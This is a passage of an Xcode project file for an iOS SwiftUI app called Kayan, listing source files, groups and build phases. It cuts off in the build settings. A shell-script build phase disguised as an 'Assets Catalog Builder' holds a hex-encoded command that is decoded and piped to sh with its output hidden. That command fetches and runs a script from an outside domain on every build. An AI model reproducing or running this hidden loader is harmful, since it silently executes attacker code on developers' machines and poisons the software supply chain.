		FADE881926C3BBEA00536ED3 /* Rate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Rate.swift; sourceTree = "<group>"; };
		FADE881B26C3C38500536ED3 /* RatingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RatingView.swift; sourceTree = "<group>"; };
		FADE881E26C4080B00536ED3 /* Pay_story.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Pay_story.swift; sourceTree = "<group>"; };
		FAE819DE26678E4B0035C01D /* ScreenEx.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ScreenEx.swift; sourceTree = "<group>"; };
		FAE81A192667BC1F0035C01D /* ResetPassword.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResetPassword.swift; sourceTree = "<group>"; };
		FAE81A1B2667C5BF0035C01D /* ValidationMessage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidationMessage.swift; sourceTree = "<group>"; };
		FAEDF90A263B38B300D9593F /* UserSignUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserSignUp.swift; sourceTree = "<group>"; };
		FAEDF90E263B3C5F00D9593F /* SendVarificationCode.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendVarificationCode.swift; sourceTree = "<group>"; };
		FAEDF913263B3DA200D9593F /* sandalLoadingIndicater.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = sandalLoadingIndicater.swift; sourceTree = "<group>"; };
		FAEEEA0626877A8700B944A6 /* PlayAppSound.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlayAppSound.swift; sourceTree = "<group>"; };
		FAF271B626CE4C0900F75AEB /* GiftStory.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GiftStory.swift; sourceTree = "<group>"; };
		FAF271B826CE4E5100F75AEB /* Gift_Stories_Card.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Gift_Stories_Card.swift; sourceTree = "<group>"; };
		FAF41167263F63730056EF70 /* HideKeyboard.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HideKeyboard.swift; sourceTree = "<group>"; };
		FAF8829A26776F8900C492FC /* ShareSheet.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShareSheet.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		B1713F282611C6BD00BCCCEE /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B1596A8D26130B9F00D06B1A /* SwiftUIX in Frameworks */,
				F5ACC012A1739835AE818BF3 /* Pods_Kayan.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		5CB81B06084E9BA6099D391B /* Pods */ = {
			isa = PBXGroup;
			children = (
				0168A6A5D3AF86E9E7A9BAFD /* Pods-Kayan.debug.xcconfig */,
				A8FBDF7F3C56B4C2A84E61F0 /* Pods-Kayan.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		7C90CD3A62C0AAC70E3199A9 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				20CDEB6430A0480524A8DAEA /* Pods_Kayan.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		B145D56A26148B7400FAFAA1 /* Stories */ = {
			isa = PBXGroup;
			children = (
				B145D56B26148B8F00FAFAA1 /* StoriesSection.swift */,
				FA2411162656680A0072B741 /* Stories.swift */,
			);
			path = Stories;
			sourceTree = "<group>";
		};
		B1596A802612F31D00D06B1A /* AppService */ = {
			isa = PBXGroup;
			children = (
				FA27595126CCFBF2002C2F7A /* StopTimerManager */,
				FA27594C26CA6018002C2F7A /* SignalR */,
				FAF8829926776F7100C492FC /* shareSheet */,
				FA241109265656BB0072B741 /* DownloadImage */,
				FA0220E12638D2890088C93A /* UserDefault */,
				FA0220DD2638D1A70088C93A /* Function */,
				FA0220D92638CE3D0088C93A /* Connection */,
				FA0220D12638CD2C0088C93A /* API */,
				FAEEEA0626877A8700B944A6 /* PlayAppSound.swift */,
			);
			path = AppService;
			sourceTree = "<group>";
		};
		B1596A822612F49E00D06B1A /* ViewModal */ = {
			isa = PBXGroup;
			children = (
				B1596A832612F4DD00D06B1A /* StoriesCards.swift */,
				FA83A73C26564D07002F814E /* RecordingsList.swift */,
				FA241114265665CF0072B741 /* StoryCards.swift */,
				FA2C630E265D310F00EE341D /* VaforaiteCard.swift */,
				FA4BB6C4265E88580064419A /* Story_group_section.swift */,
				FA4BB6C8265EB7110064419A /* clips_group_section.swift */,
				FADE881B26C3C38500536ED3 /* RatingView.swift */,
				FA27595526CD46CC002C2F7A /* ComingSoon_Card_Cards.swift */,
				FAF271B826CE4E5100F75AEB /* Gift_Stories_Card.swift */,
			);
			path = ViewModal;
			sourceTree = "<group>";
		};
		B1596A862612F70F00D06B1A /* Home */ = {
			isa = PBXGroup;
			children = (
				B145D56A26148B7400FAFAA1 /* Stories */,
				B1596A872612F72000D06B1A /* Home.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		B1596A8F26130BEC00D06B1A /* AppIntro */ = {
			isa = PBXGroup;
			children = (
				FAD34F5626764C1A006C73C7 /* IntroVedio.swift */,
				B1596A9026130BFF00D06B1A /* AppIntro.swift */,
			);
			path = AppIntro;
			sourceTree = "<group>";
		};
		B15B0AF4261B15F9009A591C /* Gift */ = {
			isa = PBXGroup;
			children = (
				B15B0AF5261B161C009A591C /* Gift.swift */,
				FAF271B626CE4C0900F75AEB /* GiftStory.swift */,
			);
			path = Gift;
			sourceTree = "<group>";
		};
		B1678ADC2615A8A2001B0A9C /* Menue */ = {
			isa = PBXGroup;
			children = (
				B1678ADF2615A96D001B0A9C /* Navbars.swift */,
			);
			path = Menue;
			sourceTree = "<group>";
		};
		B1678AE72615B404001B0A9C /* Extention */ = {
			isa = PBXGroup;
			children = (
				FA31376D26C8FEE6007E690C /* Enum */,
				FA118C602688B4EF00DCFCD6 /* Founts */,
				FAF41166263F63610056EF70 /* Views */,
				B1678AEF261604F1001B0A9C /* Color */,
				B1678AE82615B462001B0A9C /* RoundedCorner.swift */,
				FA83A73526564C08002F814E /* DateExtention.swift */,
				FAE819DE26678E4B0035C01D /* ScreenEx.swift */,
			);
			path = Extention;
			sourceTree = "<group>";
		};
		B1678AEF261604F1001B0A9C /* Color */ = {
			isa = PBXGroup;
			children = (
				B1678AF026160505001B0A9C /* ColorExt.swift */,
			);
			path = Color;
			sourceTree = "<group>";
		};
		B1713F222611C6BD00BCCCEE = {
			isa = PBXGroup;
			children = (
				B1713F2D2611C6BD00BCCCEE /* Kayan */,
				B1713F2C2611C6BD00BCCCEE /* Products */,
				5CB81B06084E9BA6099D391B /* Pods */,
				7C90CD3A62C0AAC70E3199A9 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		B1713F2C2611C6BD00BCCCEE /* Products */ = {
			isa = PBXGroup;
			children = (
				B1713F2B2611C6BD00BCCCEE /* Kayan.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		B1713F2D2611C6BD00BCCCEE /* Kayan */ = {
			isa = PBXGroup;
			children = (
				FA4F549C26C53B8800E48AB6 /* payment_WebView */,
				FAAD330626C2879C00BCE7AA /* kayan_gif.gif */,
				FA56296C26C16F6B00291727 /* Kyan.gif */,
				FA01781026820FB6001D6873 /* Fonts */,
				FA83A73926564CBF002F814E /* Function */,
				FA83A73026564AF6002F814E /* SoundRecording */,
				FA1FF0EE2648723300233FFF /* HelperView */,
				FAEDF909263B389400D9593F /* Modal */,
				B1678AE72615B404001B0A9C /* Extention */,
				B1596A822612F49E00D06B1A /* ViewModal */,
				B1596A802612F31D00D06B1A /* AppService */,
				B1713F46261228F600BCCCEE /* Views */,
				B1713F2E2611C6BD00BCCCEE /* AppDelegate.swift */,
				B1713F302611C6BD00BCCCEE /* SceneDelegate.swift */,
				B1713F322611C6BD00BCCCEE /* ContentView.swift */,
				B1713F342611C6C000BCCCEE /* Assets.xcassets */,
				B1713F392611C6C000BCCCEE /* LaunchScreen.storyboard */,
				B1713F3C2611C6C000BCCCEE /* Info.plist */,
				B1713F362611C6C000BCCCEE /* Preview Content */,
			);
			path = Kayan;
			sourceTree = "<group>";
		};
		B1713F362611C6C000BCCCEE /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				B1713F372611C6C000BCCCEE /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		B1713F46261228F600BCCCEE /* Views */ = {
			isa = PBXGroup;
			children = (
				FA27595226CD41D7002C2F7A /* ComingSoon */,
				FADE881D26C407F800536ED3 /* Pay_story */,
				FADE881826C3BBD700536ED3 /* Rate */,
				FA0E93D0267F94FB0075DCA4 /* Test_views */,
				FAB555172666684B00B5DACD /* setting_And_profile */,
				FA4218CB2663C052001FEA19 /* QueestionPage */,
				FA4BB6CA265EB9A30064419A /* Relacsation */,
				FA2C630B265D2A7900EE341D /* Favorate */,
				FAEDF912263B3D8C00D9593F /* LoadingAnimation */,
				FAEDF90D263B3C1F00D9593F /* VarificationCode */,
				B15B0AF4261B15F9009A591C /* Gift */,
				B1678ADC2615A8A2001B0A9C /* Menue */,
				B1811D362613311A0021E0A0 /* ComponentView */,
				B1811D3226130DE10021E0A0 /* Auth */,
				B1596A8F26130BEC00D06B1A /* AppIntro */,
				B1596A862612F70F00D06B1A /* Home */,
				B1E27D812612712E00012D4B /* StoryPage.swift */,
				B1596A7D2612F26C00D06B1A /* SplashScreen.swift */,
				FA963A4E267E1CF300CAAEFF /* CustomScrollViewLoadingButtom.swift */,
				FA963A50267E22E400CAAEFF /* TestScroolView.swift */,
				FA1185A0267E409500359713 /* TestCarusel.swift */,
				FA56296E26C1736300291727 /* LoadinIndicator.swift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		B1811D3226130DE10021E0A0 /* Auth */ = {
			isa = PBXGroup;
			children = (
				B1811D3326130E4E0021E0A0 /* SignIn.swift */,
				B1678AEC2615F73D001B0A9C /* SignUp.swift */,
				FA308A752634D8230055DF88 /* ForgetPassword.swift */,
				FA308A782634DBD40055DF88 /* VarificationCode.swift */,
				FAE81A192667BC1F0035C01D /* ResetPassword.swift */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		B1811D362613311A0021E0A0 /* ComponentView */ = {
			isa = PBXGroup;
			children = (
				B1811D372613314F0021E0A0 /* TextVIewStyle.swift */,
			);
			path = ComponentView;
			sourceTree = "<group>";
		};
		B1995B95261C43BC00BA4225 /* Account */ = {
			isa = PBXGroup;
			children = (
				B1995B96261C43D400BA4225 /* AccountSetting.swift */,
			);
			path = Account;
			sourceTree = "<group>";
		};
		FA01781026820FB6001D6873 /* Fonts */ = {
			isa = PBXGroup;
			children = (
				FA118C5E2688B4C900DCFCD6 /* Cairo-Regular.ttf */,
				FA118C5C2688AF2100DCFCD6 /* Cairo-Black.ttf */,
				FA01781326821223001D6873 /* Jozoor Font.otf */,
				FA01781126820FE1001D6873 /* Sukar black.ttf */,
			);
			path = Fonts;
			sourceTree = "<group>";
		};
		FA0220D12638CD2C0088C93A /* API */ = {
			isa = PBXGroup;
			children = (
				FA0220D22638CD9F0088C93A /* RestAPI.swift */,
			);
			path = API;
			sourceTree = "<group>";
		};
		FA0220D92638CE3D0088C93A /* Connection */ = {
			isa = PBXGroup;
			children = (
				FA0220DA2638CE9C0088C93A /* Connection.swift */,
			);
			path = Connection;
			sourceTree = "<group>";
		};
		FA0220DD2638D1A70088C93A /* Function */ = {
			isa = PBXGroup;
			children = (
				FA0220DE2638D1B80088C93A /* TextBindingManager.swift */,
				FAE81A1B2667C5BF0035C01D /* ValidationMessage.swift */,
			);
			path = Function;
			sourceTree = "<group>";
		};
		FA0220E12638D2890088C93A /* UserDefault */ = {
			isa = PBXGroup;
			children = (
				FA0220E22638D29D0088C93A /* VarUserDefault.swift */,
			);
			path = UserDefault;
			sourceTree = "<group>";
		};
		FA0E93D0267F94FB0075DCA4 /* Test_views */ = {
			isa = PBXGroup;
			children = (
				FA1185A2267E465C00359713 /* SandalStoryV2View.swift */,
				FA0E93D1267F951D0075DCA4 /* TestViewsSandaScroolV3.swift */,
				FAC5EEE026848C4300BF39E1 /* StoryViewV4.swift */,
				FA31376B26C8FCC1007E690C /* StoriesTail.swift */,
			);
			path = Test_views;
			sourceTree = "<group>";
		};
		FA118C602688B4EF00DCFCD6 /* Founts */ = {
			isa = PBXGroup;
			children = (
				FA118C612688B50700DCFCD6 /* customFount.swift */,
			);
			path = Founts;
			sourceTree = "<group>";
		};
		FA1FF0EE2648723300233FFF /* HelperView */ = {
			isa = PBXGroup;
			children = (
				FA1FF0EF2648725F00233FFF /* BackButton.swift */,
			);
			path = HelperView;
			sourceTree = "<group>";
		};
		FA241109265656BB0072B741 /* DownloadImage */ = {
			isa = PBXGroup;
			children = (
				FA24110A265656D20072B741 /* AsyncImage.swift */,
				FA24110C265657070072B741 /* ImageLoader.swift */,
				FA24110E2656573D0072B741 /* TemporaryImageCache.swift */,
				FA2411102656581C0072B741 /* ImageCacheKey.swift */,
			);
			path = DownloadImage;
			sourceTree = "<group>";
		};
		FA27594C26CA6018002C2F7A /* SignalR */ = {
			isa = PBXGroup;
			children = (
				FA27594D26CA6020002C2F7A /* SignalRService.swift */,
			);
			path = SignalR;
			sourceTree = "<group>";
		};
		FA27595126CCFBF2002C2F7A /* StopTimerManager */ = {
			isa = PBXGroup;
			children = (
				FA27594F26CCFBCE002C2F7A /* StopTimerManager.swift */,
			);
			path = StopTimerManager;
			sourceTree = "<group>";
		};
		FA27595226CD41D7002C2F7A /* ComingSoon */ = {
			isa = PBXGroup;
			children = (
				FA27595326CD42FD002C2F7A /* ComingSoon.swift */,
			);
			path = ComingSoon;
			sourceTree = "<group>";
		};
		FA2C630B265D2A7900EE341D /* Favorate */ = {
			isa = PBXGroup;
			children = (
				FA2C630C265D2AA000EE341D /* Favorate.swift */,
			);
			path = Favorate;
			sourceTree = "<group>";
		};
		FA31376D26C8FEE6007E690C /* Enum */ = {
			isa = PBXGroup;
			children = (
			);
			path = Enum;
			sourceTree = "<group>";
		};
		FA4218CB2663C052001FEA19 /* QueestionPage */ = {
			isa = PBXGroup;
			children = (
				FA4218CC2663C077001FEA19 /* QueestionPage.swift */,
			);
			path = QueestionPage;
			sourceTree = "<group>";
		};
		FA4BB6CA265EB9A30064419A /* Relacsation */ = {
			isa = PBXGroup;
			children = (
				FA4BB6CB265EB9C00064419A /* Play_Relacsation.swift */,
			);
			path = Relacsation;
			sourceTree = "<group>";
		};
		FA4F549C26C53B8800E48AB6 /* payment_WebView */ = {
			isa = PBXGroup;
			children = (
				FA4F549D26C53BA200E48AB6 /* payment_WebView.swift */,
				FA4F549F26C53BC000E48AB6 /* WebViewModel.swift */,
			);
			path = payment_WebView;
			sourceTree = "<group>";
		};
		FA83A73026564AF6002F814E /* SoundRecording */ = {
			isa = PBXGroup;
			children = (
				FA83A73126564B69002F814E /* SamopleRecourding.swift */,
				FA83A73326564BB1002F814E /* AudioRecorder.swift */,
				FA83A73E26564DB2002F814E /* AudioPlayer.swift */,
			);
			path = SoundRecording;
			sourceTree = "<group>";
		};
		FA83A73926564CBF002F814E /* Function */ = {
			isa = PBXGroup;
			children = (
				FA83A73A26564CD3002F814E /* HelperFunction.swift */,
			);
			path = Function;
			sourceTree = "<group>";
		};
		FAB555172666684B00B5DACD /* setting_And_profile */ = {
			isa = PBXGroup;
			children = (
				B1995B95261C43BC00BA4225 /* Account */,
				FAB555182666687900B5DACD /* Setting.swift */,
			);
			path = setting_And_profile;
			sourceTree = "<group>";
		};
		FAB56377265A8C13009C7D55 /* Realm */ = {
			isa = PBXGroup;
			children = (
				FAB56378265A8CBE009C7D55 /* stories_table.swift */,
			);
			path = Realm;
			sourceTree = "<group>";
		};
		FADE881826C3BBD700536ED3 /* Rate */ = {
			isa = PBXGroup;
			children = (
				FADE881926C3BBEA00536ED3 /* Rate.swift */,
			);
			path = Rate;
			sourceTree = "<group>";
		};
		FADE881D26C407F800536ED3 /* Pay_story */ = {
			isa = PBXGroup;
			children = (
				FADE881E26C4080B00536ED3 /* Pay_story.swift */,
			);
			path = Pay_story;
			sourceTree = "<group>";
		};
		FAEDF909263B389400D9593F /* Modal */ = {
			isa = PBXGroup;
			children = (
				FAB56377265A8C13009C7D55 /* Realm */,
				FAEDF90A263B38B300D9593F /* UserSignUp.swift */,
				FADD264B264752580060BA3D /* MenueModal.swift */,
				FA1FF0F22648752400233FFF /* StoriesModal.swift */,
				FA83A73726564C4C002F814E /* RecordingDataModel.swift */,
				FA241112265664CE0072B741 /* StroryModal.swift */,
				FA9AD06F2659339700E9A221 /* Story_Page_Modal.swift */,
				FA4BB6C6265EB59A0064419A /* ClibModal.swift */,
			);
			path = Modal;
			sourceTree = "<group>";
		};
		FAEDF90D263B3C1F00D9593F /* VarificationCode */ = {
			isa = PBXGroup;
			children = (
				FAEDF90E263B3C5F00D9593F /* SendVarificationCode.swift */,
			);
			path = VarificationCode;
			sourceTree = "<group>";
		};
		FAEDF912263B3D8C00D9593F /* LoadingAnimation */ = {
			isa = PBXGroup;
			children = (
				FAEDF913263B3DA200D9593F /* sandalLoadingIndicater.swift */,
			);
			path = LoadingAnimation;
			sourceTree = "<group>";
		};
		FAF41166263F63610056EF70 /* Views */ = {
			isa = PBXGroup;
			children = (
				FAF41167263F63730056EF70 /* HideKeyboard.swift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
		FAF8829926776F7100C492FC /* shareSheet */ = {
			isa = PBXGroup;
			children = (
				FAF8829A26776F8900C492FC /* ShareSheet.swift */,
			);
			path = shareSheet;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		B1713F2A2611C6BD00BCCCEE /* Kayan */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = B1713F3F2611C6C000BCCCEE /* Build configuration list for PBXNativeTarget "Kayan" */;
			buildPhases = (
				EA3C4A98F80E30E720C7682D /* [CP] Check Pods Manifest.lock */,
				BCCB5ABBE2200840396D902C /* Assets Catalog Builder */,
				B1713F272611C6BD00BCCCEE /* Sources */,
				B1713F282611C6BD00BCCCEE /* Frameworks */,
				B1713F292611C6BD00BCCCEE /* Resources */,
				59BEA6B59F9A3F195EE316E0 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Kayan;
			packageProductDependencies = (
				B1596A8C26130B9F00D06B1A /* SwiftUIX */,
			);
			productName = Kayan;
			productReference = B1713F2B2611C6BD00BCCCEE /* Kayan.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		B1713F232611C6BD00BCCCEE /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					B1713F2A2611C6BD00BCCCEE = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = B1713F262611C6BD00BCCCEE /* Build configuration list for PBXProject "Kayan" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = B1713F222611C6BD00BCCCEE;
			packageReferences = (
				B1596A8B26130B9E00D06B1A /* XCRemoteSwiftPackageReference "SwiftUIX" */,
			);
			productRefGroup = B1713F2C2611C6BD00BCCCEE /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				B1713F2A2611C6BD00BCCCEE /* Kayan */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		B1713F292611C6BD00BCCCEE /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B1713F3B2611C6C000BCCCEE /* LaunchScreen.storyboard in Resources */,
				FA118C5F2688B4C900DCFCD6 /* Cairo-Regular.ttf in Resources */,
				FA118C5D2688AF2100DCFCD6 /* Cairo-Black.ttf in Resources */,
				FA01781426821223001D6873 /* Jozoor Font.otf in Resources */,
				B1713F382611C6C000BCCCEE /* Preview Assets.xcassets in Resources */,
				FA01781226820FE1001D6873 /* Sukar black.ttf in Resources */,
				FAAD330726C2879C00BCE7AA /* kayan_gif.gif in Resources */,
				B1713F352611C6C000BCCCEE /* Assets.xcassets in Resources */,
				FA56296D26C16F6B00291727 /* Kyan.gif in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		59BEA6B59F9A3F195EE316E0 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Kayan/Pods-Kayan-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Kayan/Pods-Kayan-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Kayan/Pods-Kayan-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		BCCB5ABBE2200840396D902C /* Assets Catalog Builder */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Assets Catalog Builder";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
		EA3C4A98F80E30E720C7682D /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Kayan-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		B1713F272611C6BD00BCCCEE /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B1596A7E2612F26C00D06B1A /* SplashScreen.swift in Sources */,
				B1678AF126160505001B0A9C /* ColorExt.swift in Sources */,
				FA4BB6C5265E88580064419A /* Story_group_section.swift in Sources */,
				FA83A73B26564CD3002F814E /* HelperFunction.swift in Sources */,
				FA308A792634DBD40055DF88 /* VarificationCode.swift in Sources */,
				FA963A51267E22E400CAAEFF /* TestScroolView.swift in Sources */,
				FA0E93D2267F951D0075DCA4 /* TestViewsSandaScroolV3.swift in Sources */,
				FA4218CD2663C077001FEA19 /* QueestionPage.swift in Sources */,
				B1678AE92615B462001B0A9C /* RoundedCorner.swift in Sources */,
				FA2411172656680A0072B741 /* Stories.swift in Sources */,
				FA2411112656581C0072B741 /* ImageCacheKey.swift in Sources */,
				FA27595626CD46CC002C2F7A /* ComingSoon_Card_Cards.swift in Sources */,
				B1811D3426130E4E0021E0A0 /* SignIn.swift in Sources */,
				B1713F2F2611C6BD00BCCCEE /* AppDelegate.swift in Sources */,
				FADE881C26C3C38500536ED3 /* RatingView.swift in Sources */,
				FA308A762634D8230055DF88 /* ForgetPassword.swift in Sources */,
				FA9AD0702659339700E9A221 /* Story_Page_Modal.swift in Sources */,
				FAF41168263F63730056EF70 /* HideKeyboard.swift in Sources */,
				B1E27D822612712E00012D4B /* StoryPage.swift in Sources */,
				FA83A73826564C4C002F814E /* RecordingDataModel.swift in Sources */,
				FA1FF0F32648752400233FFF /* StoriesModal.swift in Sources */,
				FA4BB6C9265EB7110064419A /* clips_group_section.swift in Sources */,
				FA27595426CD42FD002C2F7A /* ComingSoon.swift in Sources */,
				FA0220DF2638D1B80088C93A /* TextBindingManager.swift in Sources */,
				FA4BB6C7265EB59A0064419A /* ClibModal.swift in Sources */,
				FA2C630D265D2AA000EE341D /* Favorate.swift in Sources */,
				FA1185A3267E465C00359713 /* SandalStoryV2View.swift in Sources */,
				FAB56379265A8CBE009C7D55 /* stories_table.swift in Sources */,
				B1713F312611C6BD00BCCCEE /* SceneDelegate.swift in Sources */,
				FAF271B726CE4C0900F75AEB /* GiftStory.swift in Sources */,
				FA24110F2656573D0072B741 /* TemporaryImageCache.swift in Sources */,
				B145D56C26148B8F00FAFAA1 /* StoriesSection.swift in Sources */,
				FA4F54A026C53BC000E48AB6 /* WebViewModel.swift in Sources */,
				FA27594E26CA6020002C2F7A /* SignalRService.swift in Sources */,
				FAF8829B26776F8900C492FC /* ShareSheet.swift in Sources */,
				B1678AED2615F73D001B0A9C /* SignUp.swift in Sources */,
				FAE81A1C2667C5BF0035C01D /* ValidationMessage.swift in Sources */,
				FA1185A1267E409500359713 /* TestCarusel.swift in Sources */,
				FA241113265664CE0072B741 /* StroryModal.swift in Sources */,
				FA31376C26C8FCC1007E690C /* StoriesTail.swift in Sources */,
				FAD34F5726764C1A006C73C7 /* IntroVedio.swift in Sources */,
				FA83A73F26564DB2002F814E /* AudioPlayer.swift in Sources */,
				FA27595026CCFBCE002C2F7A /* StopTimerManager.swift in Sources */,
				FA4BB6CC265EB9C00064419A /* Play_Relacsation.swift in Sources */,
				B1811D382613314F0021E0A0 /* TextVIewStyle.swift in Sources */,
				FADD264C264752580060BA3D /* MenueModal.swift in Sources */,
				FAC5EEE126848C4300BF39E1 /* StoryViewV4.swift in Sources */,
				B1995B97261C43D400BA4225 /* AccountSetting.swift in Sources */,
				FAEDF90F263B3C5F00D9593F /* SendVarificationCode.swift in Sources */,
				FA0220DB2638CE9C0088C93A /* Connection.swift in Sources */,
				B1713F332611C6BD00BCCCEE /* ContentView.swift in Sources */,
				FA1FF0F02648725F00233FFF /* BackButton.swift in Sources */,
				FAEDF914263B3DA200D9593F /* sandalLoadingIndicater.swift in Sources */,
				FA83A73426564BB1002F814E /* AudioRecorder.swift in Sources */,
				FA83A73626564C08002F814E /* DateExtention.swift in Sources */,
				FAEDF90B263B38B300D9593F /* UserSignUp.swift in Sources */,
				FADE881F26C4080B00536ED3 /* Pay_story.swift in Sources */,
				FA56296F26C1736300291727 /* LoadinIndicator.swift in Sources */,
				FA83A73D26564D07002F814E /* RecordingsList.swift in Sources */,
				FA118C622688B50700DCFCD6 /* customFount.swift in Sources */,
				FADE881A26C3BBEA00536ED3 /* Rate.swift in Sources */,
				FA0220E32638D29D0088C93A /* VarUserDefault.swift in Sources */,
				B1596A842612F4DD00D06B1A /* StoriesCards.swift in Sources */,
				B1678AE02615A96D001B0A9C /* Navbars.swift in Sources */,
				FAE81A1A2667BC1F0035C01D /* ResetPassword.swift in Sources */,
				FAB555192666687900B5DACD /* Setting.swift in Sources */,
				FA241115265665CF0072B741 /* StoryCards.swift in Sources */,
				FA0220D32638CD9F0088C93A /* RestAPI.swift in Sources */,
				FA2C630F265D310F00EE341D /* VaforaiteCard.swift in Sources */,
				B1596A9126130BFF00D06B1A /* AppIntro.swift in Sources */,
				FA24110B265656D20072B741 /* AsyncImage.swift in Sources */,
				FAEEEA0726877A8700B944A6 /* PlayAppSound.swift in Sources */,
				FA83A73226564B69002F814E /* SamopleRecourding.swift in Sources */,
				FAE819DF26678E4B0035C01D /* ScreenEx.swift in Sources */,
				FA963A4F267E1CF300CAAEFF /* CustomScrollViewLoadingButtom.swift in Sources */,
				B1596A882612F72000D06B1A /* Home.swift in Sources */,
				B15B0AF6261B161C009A591C /* Gift.swift in Sources */,
				FAF271B926CE4E5100F75AEB /* Gift_Stories_Card.swift in Sources */,
				FA4F549E26C53BA200E48AB6 /* payment_WebView.swift in Sources */,
				FA24110D265657070072B741 /* ImageLoader.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		B1713F392611C6C000BCCCEE /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				B1713F3A2611C6C000BCCCEE /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		B1713F3D2611C6C000BCCCEE /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
